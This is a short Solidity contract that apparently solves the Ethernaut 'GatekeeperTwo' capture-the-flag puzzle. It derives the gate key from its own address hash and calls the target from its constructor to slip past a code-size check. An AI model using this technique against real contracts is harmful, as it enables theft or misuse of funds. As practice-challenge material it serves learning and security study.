// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {
    constructor(IGatekeeperTwo _target) {
        bytes8 _gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(type(uint64).max)
        );
        _target.enter(_gateKey);
    }
}
